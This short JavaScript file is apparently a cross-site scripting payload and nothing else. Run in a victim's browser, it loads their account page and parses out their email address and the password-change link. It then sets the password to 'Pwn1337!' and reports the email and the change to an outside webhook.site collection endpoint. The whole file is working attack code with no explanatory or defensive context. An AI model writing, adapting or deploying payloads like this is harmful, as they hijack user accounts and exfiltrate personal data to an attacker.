 var parser = new DOMParser();


var xhr = new XMLHttpRequest();
xhr.open("GET", "http://xxxx/index.php?page=account");

var xhr2 = new XMLHttpRequest();
xhr2.open("POST", "https://webhook.site/xxxx");

var xhr3 = new XMLHttpRequest();

var datapass = "password=Pwn1337!&password_confirm=Pwn1337!"





xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

xhr.onreadystatechange = function () {
   if (xhr.readyState === 4) {
      
      
      
      var page = parser.parseFromString(xhr.responseText, "text/html");
      
      var url_pass = page.getElementsByClassName("btn-warning");
      var email =  page.getElementsByClassName("info-box-number");
     
      xhr3.open("POST", url_pass[0].href);
      xhr3.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
      xhr3.send(datapass);
      
      var extract = "Compte : "+ email[0].innerHTML + " a changé son mdp par 'Pwn1337!'"
      xhr2.send(extract);
   }};


xhr.send(); 
